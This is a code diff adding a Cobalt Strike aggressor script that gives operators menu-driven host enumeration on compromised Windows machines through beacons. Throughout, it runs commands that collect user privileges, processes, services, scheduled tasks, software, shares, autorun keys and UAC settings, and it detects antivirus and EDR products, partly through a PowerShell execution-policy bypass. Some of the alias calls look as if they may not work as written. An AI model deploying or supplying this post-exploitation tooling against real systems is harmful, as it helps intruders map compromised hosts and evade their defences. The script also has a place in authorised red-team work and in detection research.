@@ -1,0 +1,131 @@
+# sys_enum.cna — System / host enumeration
+# Registers: aliases, beacon right-click menu items
+# Requires: Cobalt Strike 4.x+
+
+# ─── aliases ────────────────────────────────────────────────────────────────
+
+alias sysinfo {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] System info collection started");
+
+    bshell($bid, "whoami /all");
+    bshell($bid, "hostname");
+    bshell($bid, "systeminfo");
+    bshell($bid, "wmic os get Caption,Version,BuildNumber,OSArchitecture /format:list");
+    bshell($bid, "wmic computersystem get Manufacturer,Model,TotalPhysicalMemory /format:list");
+}
+
+alias proclist {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating running processes");
+    bps($bid);
+    bshell($bid, "tasklist /v /fo csv");
+}
+
+alias services-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating services");
+    bshell($bid, "sc query type= all state= all");
+    bshell($bid, "wmic service get Name,DisplayName,StartName,State,PathName /format:list");
+}
+
+alias tasks-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating scheduled tasks");
+    bshell($bid, "schtasks /query /fo LIST /v");
+}
+
+alias software-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating installed software");
+    bshell($bid, "wmic product get Name,Version,InstallDate /format:list");
+    bshell($bid, "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName");
+    bshell($bid, "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName");
+}
+
+alias env-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating environment variables and paths");
+    bshell($bid, "set");
+    bshell($bid, "echo %PATH%");
+    bshell($bid, "wmic environment get Name,VariableValue,UserName /format:list");
+}
+
+alias drives-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating drives and shares");
+    bshell($bid, "wmic logicaldisk get DeviceID,DriveType,FileSystem,FreeSpace,Size,VolumeName /format:list");
+    bshell($bid, "net share");
+    bshell($bid, "net use");
+}
+
+alias reg-autorun {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking registry autorun locations");
+    bshell($bid, "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+    bshell($bid, "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+    bshell($bid, "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
+    bshell($bid, "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
+    bshell($bid, "reg query HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
+}
+
+alias av-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Detecting AV / EDR products");
+    bshell($bid, "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,pathToSignedProductExe,productState /format:list");
+    bshell($bid, "sc query windefend");
+    bshell($bid, "powershell -ep bypass -c \"Get-MpComputerStatus | Select-Object AMRunningMode,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled\"");
+}
+
+alias uac-check {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking UAC configuration");
+    bshell($bid, "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA");
+    bshell($bid, "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin");
+    bshell($bid, "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy");
+}
+
+alias sys-enum-all {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c2[*] === Running full system enumeration ===");
+    sysinfo($bid);
+    proclist($bid);
+    services-enum($bid);
+    tasks-enum($bid);
+    software-enum($bid);
+    env-enum($bid);
+    drives-enum($bid);
+    reg-autorun($bid);
+    av-enum($bid);
+    uac-check($bid);
+}
+
+# ─── right-click menu ───────────────────────────────────────────────────────
+
+popup beacon_bottom {
+    menu "Enum: System" {
+        item "Full System Info"       { sysinfo(selectedBeacons()); }
+        item "Process List"           { proclist(selectedBeacons()); }
+        item "Services"               { services-enum(selectedBeacons()); }
+        item "Scheduled Tasks"        { tasks-enum(selectedBeacons()); }
+        item "Installed Software"     { software-enum(selectedBeacons()); }
+        item "Environment / Paths"    { env-enum(selectedBeacons()); }
+        item "Drives & Shares"        { drives-enum(selectedBeacons()); }
+        item "Autorun Registry Keys"  { reg-autorun(selectedBeacons()); }
+        item "AV / EDR Detection"     { av-enum(selectedBeacons()); }
+        item "UAC Settings"           { uac-check(selectedBeacons()); }
+        separator;
+        item "\[Run All\] System Enum" { sys-enum-all(selectedBeacons()); }
+    }
+}
